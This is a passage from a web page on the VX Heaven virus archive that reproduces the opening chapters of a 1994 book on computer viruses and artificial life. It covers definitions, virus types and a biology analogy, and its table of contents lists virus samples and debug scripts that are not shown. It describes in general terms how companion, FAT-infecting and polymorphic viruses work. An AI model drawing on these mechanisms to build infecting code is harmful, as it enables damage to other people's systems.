<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Karsten Johansson 'Computer Viruses: The Technology and Evolution of an Artificial Life Form' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Karsten Johansson"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Johansson, Karsten,Computer Viruses: The Technology and Evolution of an Artificial Life Form, life, call, short, push, word, virus, offset, viruses, boot, artificial, computer, vehicle, file, test, code"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"cbedb9bb767b05b8e4d70d49275c1662c6bbf172-1498755921-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vkj00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Computer Viruses: The Technology and Evolution of an Artificial Life Form</h1><p><a href="/lib/?lang=en&amp;author=Johansson%2C%20Karsten">Karsten Johansson</a><br/> <em> 1994</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vkj00.html';</script><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/Computer%20Viruses%3A%20The%20Technology%20and%20Evolution%20of%20an%20Artificial%20Life%20Form.pdf">Download</a> PDF (629.77Kb) (You need to be registered on <a href="/forum">forum</a>)<br/>[<a style="" href="/lib/?lang=EN&amp;index=VX#vkj00">Back to index</a>] [<a href="/lib/vkj00.html#disqus_thread">Comments</a>]<br/> <form method="post" action=""><input type="hidden" name="pages" value="1"/><input type="submit" value="Turn on page numbers"/></form>
<p><strong>NOTE:</strong></p>
<p>This document was written before the advent of Internet worms and trojans. It probably contains more information about the pre-commercial internet virus scene than any other singular source, and thus I have opted to make it available to the Internet as a historical reference. There are a couple of unfinished sections, but maybe if there is enough interest, I may be convinced to finish this and update it to reflect the current state of the malware industry, and update the Artificial Life stuff since so much has happened there since 1994.</p>
<p>Permission is granted to use this information in any legitimate manner as long as (1) my copyright is maintained, (2) you give me credit for all material used, and (3) you send an email to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cea5bdafa48ebeaba0abbabcafbaa7a1a0baabbdbae0ada1a3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> so I know where and how my research and writing is being used.</p>
<p>There is no copy restriction on this document for reading or distribution, but (4) under no circumstances is sale or profit directly from my work permitted without my implicit authorization. (5) If distributed, this document must remain in its entirety, and shall not be altered from the original PDF file distributed at http://www.penetrationtest.com.</p>
<p>Publishers interested in this manuscript or any of my other works may contact me at the same email address.</p>
 
<h2>Table of contents</h2>
<ul>
<li><a href="#p1">Introduction</a></li>
<li><a href="#p2">What is a Computer Virus?</a>
<ul>
<li><a href="#p21">The Birds and the Bees</a></li>
<li><a href="#p22">Trojan Horses</a></li>
<li><a href="#p23">Worms</a></li>
</ul></li>
<li><a href="#p3">Comparative Study: Biological vs. Computer Viruses</a>
<ul>
<li><a href="#p31">Viruses Do Not Autogenerate</a></li>
<li><a href="#p32">Viruses Are Choosy</a></li>
<li><a href="#p33">Viruses Modify Their Hosts, and "Borrow" Resources</a></li>
<li><a href="#p34">Most Viruses Do Not Re-Infect</a></li>
<li><a href="#p35">Viruses Can Delay Their Symptoms</a></li>
<li><a href="#p36">Viruses Can Mutate</a></li>
<li><a href="#p37">Ignorance Is Bliss</a></li>
<li><a href="#p38">Look Before You Leap</a></li>
</ul></li>
<li><a href="#p4">A Historical Look at the Computer Virus, Artificial Life, and Synthetic Psychology</a></li>
<li><a href="#p5">The Virus in the Media</a>
<ul>
<li><a href="#p51">The Michelangelo Virus</a></li>
<li><a href="#p52">Just the Fax, Please</a></li>
<li><a href="#p53">Man: The Gullible Monkey</a></li>
</ul></li>
 
<li><a href="#p6">The Virus in the Underground</a>
<ul>
<li><a href="#p61">RABID</a></li>
<li><a href="#p62">The Bulgarian Virus Factory</a></li>
<li><a href="#p63">Anarkick Systems</a></li>
<li><a href="#p64">Soltan Griss</a></li>
<li><a href="#p65">Phalcon/SKISM</a></li>
</ul></li>
<li><a href="#p7">Keeping Your Computer Clean</a>
<ul>
<li><a href="#p71">Safe Hex</a>
<ul>
<li><a href="#p711">Use a Virus Detection Program</a></li>
<li><a href="#p712">Create an Emergency Boot Diskette</a></li>
<li><a href="#p713">Back Up Your System</a></li>
<li><a href="#p714">Test New Software for Viruses or Damaging Code</a></li>
<li><a href="#p715">Never Boot From Someone Else's Floppy Diskette</a></li>
<li><a href="#p716">Write Protect ALL Boot Diskettes</a></li>
</ul></li>
</ul></li>
<li><a href="#p8">Cleaning an Infected System</a>
<ul>
<li><a href="#p81">Executable Files</a></li>
<li><a href="#p82">Boot Sector/Master Boot Record</a></li>
</ul></li>
<li><a href="#p9">Anti-Virus Software</a>
<ul>
<li><a href="#p91">Scan Strings</a></li>
<li><a href="#p92">Filters</a></li>
<li><a href="#p93">Change Checkers</a></li>
<li><a href="#p94">Heuristic Scanning</a></li>
</ul></li>
<li><a href="#pa">Virus Cleaning Strategies</a>
<ul>
<li><a href="#pa1">Simple Erasure</a></li>
<li><a href="#pa2">Database Cleaning</a></li>
<li><a href="#pa3">Integrity Checker Cleaning</a></li>
<li><a href="#pa4">Virus Simulation Cleaning</a></li>
</ul></li>
 
<li><a href="#pb">Forgotten Functions: The System and DOS Programmers</a>
<ul>
<li><a href="#pb1">The Master Boot Record</a></li>
<li><a href="#pb2">PC Scavenger Source Code</a></li>
</ul></li>
<li><a href="#pc">Anti-Virus Product Comparison</a></li>
<li><a href="#pd">Science Says</a></li>
<li><a href="#pe">Artificial Life</a>
<ul>
<li><a href="#pe1">How "Alive" is a Computer Virus?</a>
<ul>
<li><a href="#pe11">Life is a pattern in space and time rather than a specific material object</a></li>
<li><a href="#pe12">Self-reproduction, in itself or in a related organism</a></li>
<li><a href="#pe13">Information storage of a self-representation</a></li>
<li><a href="#pe14">A metabolism that converts matter/energy</a></li>
<li><a href="#pe15">Functional interactions with the environment</a></li>
<li><a href="#pe16">Interdependence of Parts</a></li>
<li><a href="#pe17">Stability under perturbations of the environment</a></li>
<li><a href="#pe18">The ability to evolve</a></li>
<li><a href="#pe19">Growth or expansion</a></li>
<li><a href="#pe1a">Other Behavior</a></li>
</ul></li>
</ul></li>
<li><a href="#pf">Synthetic Psychology</a>
<ul>
<li><a href="#pf1">The Basic Vehicle</a></li>
<li><a href="#pf2">Giving the Vehicle a Sense of Direction</a></li>
<li><a href="#pf3">Endowment of Several Senses</a></li>
<li><a href="#pf4">Variable Sensitivity</a></li>
<li><a href="#pf5">Adding Thresholds</a></li>
<li><a href="#pf6">Adding Advanced Life-like Properties</a></li>
<li><a href="#pf7">Artificial Life vs. Synthetic Psychology: A Comparison</a></li>
</ul></li>
<li><a href="#pg">...But is it Life?</a></li>
 
<li><a href="#ph">Computer Virus Programming</a>
<ul>
<li><a href="#ph1">Reproduction</a>
<ul>
<li><a href="#ph11">Overwriting Viruses</a></li>
<li><a href="#ph12">Companion Viruses</a></li>
<li><a href="#ph13">Appending Viruses</a></li>
<li><a href="#ph14">Appending .COM Viruses</a></li>
<li><a href="#ph15">Appending .EXE Viruses</a></li>
<li><a href="#ph16">Prepending .COM Viruses</a></li>
<li><a href="#ph17">Boot Sector/MBR Viruses</a></li>
<li><a href="#ph18">File Allocation Viruses</a></li>
</ul></li>
<li><a href="#ph2">Simbiotic Relationships</a></li>
</ul></li>
<li><a href="#pi">Advanced Coding Techniques</a>
<ul>
<li><a href="#pi1">Encryption</a></li>
<li><a href="#pi2">Stealth Techniques: Advanced Hide-and-go-Seek</a></li>
<li><a href="#pi3">Anti-Hack Routines</a></li>
<li><a href="#pi4">The Manipulation Task</a>
<ul>
<li><a href="#pi41">Will the Michelangelo Format My Hard drive?</a></li>
<li><a href="#pi42">What Is the Worst Thing A Virus Can Do?</a></li>
<li><a href="#pi43">Can a Virus Damage Hardware?</a></li>
</ul></li>
</ul></li>
<li><a href="#pj">Computer Virus Samples</a>
<ul>
<li><a href="#pj1">DOS 7</a></li>
<li><a href="#pj2">Lezbo Virus</a></li>
<li><a href="#pj3">Michelangelo</a></li>
<li><a href="#pj4">SYS Inf</a></li>
<li><a href="#pj5">Little Mess</a></li>
<li><a href="#pj6">Proto 3</a></li>
</ul></li>
<li><a href="#pk">Virus Writer's Code of Ethics</a></li>
 
<li><a href="#pl">The Constitution of Worldwide Virus Writers</a></li>
<li><a href="#pm">Debug Scripts</a>
<ul>
<li><a href="#pm1">PC Scavenger Anti-Virus Master Boot Record</a>
<ul>
<li><a href="#pm11">Partition Code</a></li>
<li><a href="#pm12">Dropper Program</a></li>
</ul></li>
<li><a href="#pm2">Zippy Virus</a></li>
<li><a href="#pm3">DOS 7C</a></li>
<li><a href="#pm4">Lezbo Virus</a></li>
<li><a href="#pm5">Michelangelo Virus</a></li>
<li><a href="#pm6">Proto 3 Virus</a></li>
<li><a href="#pm7">Little Mess</a></li>
<li><a href="#pm8">SYS Inf</a></li>
</ul></li>
<li><a href="#pn">Bibliography</a></li>
<li><a href="#po">Further Reading</a></li>
</ul>
 
<p>COMPUTER VIRUSES: The Technology and Evolution of an Artificial Life Form Written by: Karsten Johansson &copy;1994 Karsten Johansson</p>
<p>This book is dedicated to Alan Mathison Turing, who inspired a whole new way to look at life.</p>
<p><strong>Thanks to:</strong></p>
<p>Jackie Lavelle; Memory Lapse; Lucifer Messiah (AS, Canada); Data Disruptor (RABID/YAM); Volatile RAM (AS, Sweden); Patti Hoffman; Christopher Langton; Bob Janesack (Safety Net); Steven Warden (Safety Net); Cap'n Crunch; Darryl Burke, David Stang (NCSA); Phalcon, ProTurbo (RABID); Mentor Brain; Steven Levy; Cyberpunk; X4Crumb (AS, Canada); Robert Adams (Akitavision); Charles Taylor; Steen Rasmussen; Dennis Ho; Transition House.</p>
<p><strong>Special Thanks to:</strong></p>
<p>Ian Young for suggesting this book in the first place; Steeve Iwanow, for his art and endless support; Steeve's parents for putting up with me during the times I used their dining room as my research office; my mother Pauline; George Talusan for his assistance and ideas; Rob VanHooren for getting me interested in the darker side of computing way back in grade 9.</p>
 
<h2><a name="p1"></a>Introduction</h2>
<div class="epigraph">
'The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead lined room with armed guards - and even then I have my doubts'
<p>-- Eugene H. Spafford</p>
</div>
<br clear="all"/>
<p>Several years ago, an acquaintance of mine phoned me after watching his computer report:</p>
<div align="center">
<em>Your PC is now STONED!!<br/>
LEGALIZE MARIJUANA</em>
</div>
<p>Though computer viruses were still very much a mystery to the few who had even heard of them, I was fortunate enough to have read an article about them earlier. In an excited rush, I grabbed a DOS setup disk and took a cab to his apartment.</p>
<p>After reinstalling DOS, I found myself with a handful of infected diskettes. Still the computer occassionally indicated it was "stoned" when the system was booted. We had failed.</p>
<p>After several months of hacking at the virus, we had the <strong>Stoned</strong> boot sector contained in a file on a diskette, and a working disassembly of its code. By this time, I
 
understood the virus functions much better. After lengthy study and experimentation, I was finally able to remove the virus from his computer, and the many diskettes we had infected throughout the process.</p>
<p>Today, there are many specialized categories of viruses, which when combined, total more than 7000 viruses<sup><a href="#f1" name="b1">1</a></sup> and virus strains world-wide. Currently, most scanning products detect up to 2000 of them. (This number seems inconsequential, as these products only concern themselves with viruses presently known in a particular market.) Also, many viruses are minor varients which are nearly indistinguishable from others in their families. However, by the time you read this, their numbers will have advanced exponentially.</p>
<p>Furthermore, viruses are becoming increasingly sophisticated. Some can circumvent virus scanners, as well as other obstacles which may impair their propagation.</p>
<p>The subjects of this pragmatic investigation are virus programs, as well as two specialized scientific branches relating to computer virus technology: Artificial Life (ALife), and Synthetic Psychology.</p>
 
<p>The truth about computer viruses is probably surrounded by more political red tape than any other development in recent history; Most people are shocked to learn that a handful of scientists are using and designing <em>beneficial</em> virus-related functions and technology.</p>
<p>What are computer viruses? What do they do? Where do they come from? What is the risk of being infected? Are viruses malicious? Do they have any positive uses - and if so, what are they? How do you get rid of a malicious virus when you find one? More importantly, how do you avoid unwanted infection?</p>
<p><strong>COMPUTER VIRUSES: The Technology and Evolution of an Artificial Life Form</strong> promises to answer these and many other questions, lifting the shroud of secrecy and revealing the real world of computer viruses. It is intended for everyone who owns, or is planning to own a PC computer system. Whether your computer is used at work or at home, this book incorporates both technical and non-technical material about computer viruses, as well as their effects on the victim.</p>
<p>This book is also devised to educate its readers about available virus scanning technology. As the writer has no product affiliation, the characteristics of computer virus scanners and their functions are presented impartially. There is considerable information on the detection and
 
removal of viral infections, and most importantly, advice promoting a virus-free environment.</p>
<p>Sections are devoted to the history of computer viruses, the testimonies of several known virus authors and researchers, the history of virus scanning, and virus myths. One section reports on the false sense of security marketed by most of the scanning products presently available.</p>
<p>For the computer addict, there are sections detailing the computer virus from a low-level point of view. Included are source code for a number of distinct study-viruses, plus several source code examples demonstrating the incredible technologies exploited in computer viruses. This easily lends itself to a study in Artificial Life and the related domain of Synthetic Psychology. Many people are unaware that scientist and hobbyists direct their attention towards these and similar living devices.</p>
 
<p>If you plan on exploring and experimenting with the source code examples contained in this book, certain hardware and software prerequisites must be satisfied. You will require:</p>
<ul>
<li>IBM PC, XT, AT or compatible personal computer.</li>
<li>MSDOS, PCDOS or DRDOS operating systems (v3.1 +).</li>
<li>Borland's TASM, Microsoft MASM or IBM MASM.</li>
<li>DEBUG, found on your DOS disks (except DR DOS).</li>
<li>LINK found on your DOS disks, if using MASM.</li>
<li>EXE2BIN, (also found on your DOS disks), if using MASM, or working with TSR virus codes.</li>
<li>A text editor for entering source code examples to compile.</li>
<li>At least a minor comprehension of Assembly programming. The code is well documented.</li>
</ul>
<p>Most files and examples in this book will work on any Intel 8086/8088 family computer. Potentially dangerous code is purposely written to only work on i80386+ based computers. If these samples are recklessly passed around, they will be detected almost immediately. This is to avoid any public disturbances.</p>
 
<p>This book conforms to the same conventions assumed by most other computer texts:</p>
<ul>
<li>Numbers followed by an h are hexadecimal numbers.</li>
<li>Numbers followed by a b are binary numbers.</li>
<li>Numbers with no letter following are standard base 10 numbers, except in the following case found only when discussing memory locations:
<div align="center"><strong>SSSS:OOOO</strong></div>
where SSSS refers to code segment, and OOOO refers to code offset. These numbers are hexadecimal.</li>
<li>The term "ASM" refers to Assembly Language.</li>
<li>ASM files are source code files written in Assembly Language.</li>
<li>The term "DOS" includes MSDOS, PCDOS, and in most cases, DRDOS.</li>
<li>The terms <em>viri, virii, vira,</em> etc are completely unfounded, and therefore will not be used. All scientists, doctors, standard and medical dictionaries agree: the plural of <em>virus</em> is <em>viruses</em>. These other "words" are just minor linguistic annoyances that we can do without.</li>
<li>A host is a file containing virus code.</li>
<li>A victim is a file targeted for infection. A successful infection causes the victim to become a host, which can then attack and infect more victims.</li>
</ul>
 
<p><strong>Computer Viruses: The Technology and Evolution of an Artificial Life Form</strong> has been written as a reference document and guide, useful for any project involving computer viruses, Synthetic Psychology, and Artificial Life.</p>
<p>Several appendices are included, as well as a glossary of Computer Virus, Artificial Life, and Synthetic Psychology related terms.</p>
<p>Before we begin our journey with the first step, I would like to welcome you to the bleeding edge of technology.</p>
 
<h2><a name="p2"></a>What is a Computer Virus?</h2>
<div class="epigraph">
'And God saw that it was good. And God blessed them, saying "Be fruitful and multiply".
<p>-- Genesis 1:21,22</p>
</div>
<br clear="all"/>
<p>For each list formulated to define the computer virus, a new virus appears with new characteristics that challenge the current preset rules. In this chapter, characteristics common to ALL viruses will be discussed. Programs equivocally resembling viruses are also considered, with special attention paid to their non-viral divergences. At the end of this section is a list of findings accurately defining the computer virus.</p>
<p>Ralph Burger, system engineer and virus researcher, describes the computer virus as:</p>
<blockquote>"...a program, designed as a prank or sabotage, that can insert executable copies of itself into other programs (including system programs). Every infected program can in turn place additional copies of the virus in other programs."<sup><a href="#f2" name="b2">2</a></sup></blockquote>
 
<p>In 1989, John McAfee, well known for his ViruScan and Clean-Up products, is more direct in asserting:</p>
<blockquote>"A virus is a computer program created to infect other programs with copies of itself. It has the ability to clone itself, so that it can multiply, constantly seeking new host environments"<sup><a href="#f3" name="b3">3</a></sup></blockquote>
<p>Today, both will have modified their views. Not all of today's computer viruses <em>inject</em> themselves into their victims, nor is cloning mandatory, as is assumed in the above definitions.</p>
<p>An example of a virus which does not actually inject its code into the victim is the <strong>Creeping Death</strong> virus from Bulgaria. Instead, this virus places a copy of itself in a protected area on the disk, and redirects all file execution calls to the virus code first, before running the requested file. Each infected disk will have only one copy of the virus code. Because it actually infects the FAT (File Allocation Table), and not the files themselves, it is termed a <em>Directory Infector</em>. This type of virus is detailed in chapter 5.</p>
<p>Another virus which does not inject code into its host is the <strong>Insufficient Memory</strong> virus. This virus infects only .EXE files by copying itself into a similarly named .COM file. For this reason, it is called a <em>Companion Virus</em>.
 
Companion viruses cause no change in their victim .EXE's, and as a result can be very difficult to detect.</p>
<p>Companion viruses abuse the DOS method of organizing executable files. If a .COM file shares the same name as an .EXE file, only the .COM file is executed; the .EXE file is completely ignored, unless it is called from the .COM file. Companion viruses are especially difficult to scan for if their code is in hidden file format. Despite this, they are the easiest to disinfect without causing damage to existing files.</p>
<p>Moreover, not all viruses need to clone themselves. A fairly recent example of a virus that doesn't clone itself is the <strong>Pogue</strong> virus. It uses what has been christened the <strong>MuTating Engine (MTE)</strong>, created by Mad Maniac and the Dark Avenger from Bulgaria.</p>
<p>The <strong>MTE</strong> is a Polymorphic Encryption routine which modifies itself upon each infection. This engine is so complex that only three bytes remain constant with each infection. The <strong>Lezbo</strong> virus, featured in chapter 6, contains a more advanced version of such an encryption engine.</p>
<p>The virus authors have been working very hard to combat the anti-virus industry, and in doing so, have changed the definition of a virus many times over.</p>
 
<h3><a name="p21"></a>The Birds and the Bees</h3>
<p>What is agreed on is that viruses do infect executable files so that they, in turn, can infect other executable files. This process is called <em>reproduction</em>.</p>
<p>Before a virus can consider reproduction, it must find a suitable victim. Programs ending with the .COM, .EXE, and .SYS extensions are usually executable files, making them perfect victims. Batch files (which end with the .BAT extension) are not truly executable. Instead, they are text files with a list of files and a few internal commands to be executed by DOS. Because they are text-based, batch files not infectable.<sup><a href="#f4" name="b4">4</a></sup></p>
<p>Also, the disk's boot sector, and the hard drive's partition table are potential vehicles for infection, as they are executed when an attempt is made to boot off of the disk. The peripatetic <strong>Stoned</strong> virus is one virus which infects the boot sector on floppy disks, or the partition table on hard drives. Although there are fewer boot sector and partition table infecters than .EXE or .COM viruses, they are the most common infectors. This is because they are much harder to detect and remove.</p>
 
<p>Recently, several underground groups began creating utilities which could spawn new viruses, or create usable source codes using configuration information provided by the program user. These virus construction utilities make virus creation increasingly uncomplicated. Even a complete novice could create viruses, simply by adding the information required by the program. Fortunately there are as yet, no construction utilities written to produce boot sector/partition table viruses.</p>
<p>There are a few known viruses which can infect .COMs, .EXEs, Boot Sectors, and Partition Tables at any given time, although they are quite rare. This type of virus is called <em>multi-partit</em><sup><a href="#f5" name="b5">5</a></sup>. Other combination infectors do exist.</p>
<p>The rarest of all virus types is the .SYS Infector. This virus type was only recently realized, and developed by virus author Dark Angel, of Phalcon/SKISM. The only virus of its type released at this time is called <strong>SYS INF</strong>, written by Dark Angel. This virus demonstrated that there are far more types of executable files on a system than one would normally consider.</p>
<p>Burger also maintains that a virus must recognize itself in another file, and avoid re-infection, or it is not
 
a genuine virus.<sup><a href="#f6" name="b6">6</a></sup> However, any program possessing all the
characteristics of a computer virus is in fact, a virus, whether or not enough care was taken in its conception to avoid infecting other copies of itself. More accurately, a virus will probably face extinction unless it takes measures to avoid reinfecting files.</p>
<p>The ensuing text explores other programs similar to computer viruses, and explains why they are not viruses. At the end, we will be able to compile our results into a good working definition of a computer virus.</p>
<h3><a name="p22"></a>Trojan Horses</h3>
<p>Trojan horses are programs devised to appear useful, but containing hidden code meant to damage the system on which they're executed.</p>
<p>There are essentially two types of Trojan horses. The first type directly causes damage as soon as it's run. It may or may not appear to do something useful while running its destructive instructions. A good example would be a program which apparently de-fragments the hard drive when, in fact, it is deleting all the files.</p>
<p>The second type is a program which actually does something useful while it secretly inserts damaging
 
instructions into another executable file. A good example would be a picture-viewer which overwrites the beginning of other executable files with code designed to format the hard drive. This acts as a stealth method, as you do not know what file actually made these alterations. The only damage done by the trojan itself is the overwriting of other files with yet another trojan.</p>
<p>Do not mistake this technique for reproduction. The Trojan code "injected" into the victim is not the same code as the Trojan which dropped it. It is unable to further copy itself.</p>
<p>In conclusion, Trojan Horses are not viruses as they do not contain code enabling reproduction.</p>
<h3><a name="p23"></a>Worms</h3>
<p>By now we have established that all viruses replicate. The Worm is a file which replicates itself by creating a copy, or copies of itself. Although this sounds a lot like a virus, worms do not make use of a host program to replicate. An example, which can be found in another chapter is the <strong>Internet/ArpaNet Worm</strong>, which wreaked havoc all over European and American networks several years ago.</p>
<p>Although the Morris worm is no longer, we can expect to see this sort of thing more often as computing becomes more ubiquitous and computers are networked together at
 
higher speeds and for greater lengths of time. Consumer grade operating systems are so bug-ridden that there will never cease to be a new attack vector that can be automated by a worm program.</p>
<p>It is commonly argued that Companion Viruses are Worms. This is simply untrue, as companion viruses do need a host program, even though they do not necessarily alter that host. Although worms may search out a suitable victim, they are not viruses, as they do not rely on a host program from which to execute.</p>
 
<p>Hence, we may define the computer virus in this manner:</p>
<p>A virus program must:</p>
<ol>
<li>rely on a host file. This includes, but is not limited to .COM's, .EXE's, .SYS's, the boot sector, and partition table.</li>
<li>contain routines causing them to search for, or to recognize files suitable for infection (i.e.: victims).</li>
<li>alter the victim files or the portion of the FAT pointing to the victim files, or make some copy of itself, named in order that it may be executed before control can be passed to the host.</li>
</ol>
<p>A program that does not employ EACH of the above properties is not a computer virus.</p>
 
<h2><a name="p3"></a>Comparative Study: Biological vs. Computer Viruses</h2>
<div class="epigraph">
"Nature's great book is written in mathematical symbols"
<p>-- Galileo</p>
</div>
<br clear="all"/>
<p>By 1984, Prof. Fred Cohen, who had conducted many experiments with reproducing programs, was credited for coining the "virus" moniker. This credit seems dubious considering novels like <em>When H.A.R.L.I.E. Was One</em><sup><a href="#f7" name="b7">7</a></sup> were loosely describing them as early as 1972. More about H.A.R.L.I.E. later.</p>
<p>Although it is unclear who coined the term "virus", it is easy to understand <em>why</em> they chose this name. Biological viruses and Computer viruses share many similar characteristics, as demonstrated in the following table:</p>
 
<table summary="">
<tr><th>Biological virus</th><th>Computer Virus</th></tr>
<tr><td>1. Viruses require infected cells to spread them. They can not autogenerate</td><td>1. Viruses require infected files to spread them. They can not autogenerate</td></tr>
<tr><td>2. Viruses attack/infect specific cell types</td><td>2. Viruses attack/infect specific file types</td></tr>
<tr><td>3. Viruses modify the victim's genetic material in some way to make reproduction possible</td><td>3. Viruses modify the victim's data in some way to make reproduction possible</td></tr>
<tr><td>4. Viruses take all or most of the control of their host cell</td><td>4. Virus code is executed before passing control to the host</td></tr>
<tr><td>5. Most viruses will not infect cells already infected by their own strain</td><td>5. Most viruses will not infect files already infected by their own strain</td></tr>
<tr><td>6. Symptoms may not appear, or may be delayed from the time of initial infection</td><td>6. Symptoms may not appear, or may be delayed from the time of initial infection</td></tr>
<tr><td>7. Viruses often mutate, making detection and disinfection difficult</td><td>7. Viruses often contain mutating code, or other "safeguards", making detection and disinfection difficult</td></tr>
<tr><td>8. Cells can be vaccinated against particular viruses</td><td>8. Files can be protected against particular viruses</td></tr>
</table>
<p>The above table shows the similarities between biological and computer viruses. For clarification, a description of each similarity follows.</p>
<h3><a name="p31"></a>Viruses Do Not Autogenerate</h3>
<p>Both biological and computer viruses require a host in which to fulfil their duties. In both cases, the virus robs the host of its resources in order to reproduce and survive.</p>
 
<p>It is debatable whether the necessary elements could suddenly and spontaneously collide to form a virus in either environment. Various probability equations have been developed to calculate the possibility of this occurring. All agree that we just are not going to witness such an occurrence on the computer.</p>
<h3><a name="p32"></a>Viruses Are Choosy</h3>
<p>Biological viruses are limited to infecting only certain cell types. For instance, the virus that brings us Influenza prefers infecting red blood cells, because they possess the necessary resources for viral reproduction. The Influenza virus cells are not going to accidentally infect lymph material. (However, there are many different viruses which do infect the lymph system.)</p>
<p>Similarly, computer viruses can only infect types of files that they are written to infect. A .COM-only infecting virus is unable to peek into the boot sector or to infect it.</p>
<p>Multi-partit variants of .COM viruses, however, have the added feature of being able to do this. By the same token, a virus such as this would be unable to infect .EXE type files, or .SYS type files. Moreover, some variants of .EXE viruses allow it to infect boot sectors as well. This type of virus is unable to infect .COM or .SYS type files.
 
There are numerous combinations of infection techniques possible with multi-partit viruses.</p>
<p>During the <strong>Michelangelo</strong> uproar of 1992, I was given a copy of a communications program which was reportedly infected by the virus. Since <strong>Michelangelo</strong> is a Boot Sector Virus, it is completely unable to infect .COM and .EXE files. The disk was clean.</p>
<p><em>Computer viruses can only infect the types of files they are programmed to infect.</em></p>
<h3><a name="p33"></a>Viruses Modify Their Hosts, and "Borrow" Resources</h3>
<p>Red blood cells are manufactured by the body, in order to supply the rest of the body with oxygen, and to remove waste products. Once infected, the red blood cell loses its ability to function as usual, as the virus has altered the cell to create a more desirable habitat. Some viruses have very minimal effect on the host cell, while others completely devastate the victim.</p>
<p>Computer viruses also alter their host, or cause it to operate in some way that permits reproduction. This alteration causes the virus code to be run before control can be returned to the host. A virus appended to the end of its host, that repatches the file beginning, has little effect on its host. On the other hand, a virus which
 
completely overwrites its victim, permanently damaging its code, can be very detrimental to the system.</p>
<p>One of the few virus types which does not modify the code is the <em>companion</em>-type virus. The <em>borrowed</em> resource, in this case, is the name of the .EXE file it is infecting. This virus form will be discussed in another chapter. The directory infector, explained in Chapter Five, is the other kind. The resource borrowed is the host's entry in the File Allocation Table.</p>
<h3><a name="p34"></a>Most Viruses Do Not Re-Infect</h3>
<p>A cell littered with pieces of DNA from a virus is usually not re-infected; the absence of reinfection is due to the lack of room for reproduction to take place. As well, the cell resources are often depleted beyond usability.</p>
<p>Most computer viruses embody some form of identification that is transferred to each infected file so it won't be re-infected. Viruses that do not do this are noticed quickly, due to the extreme file size increases, and the eventual program crashes caused by the code's inability to fit into memory.</p>
<p>It is possible, in both cases, that the host may be infected by more than one virus type. Nevertheless, it is highly unlikely that the host will accumulate multiple
 
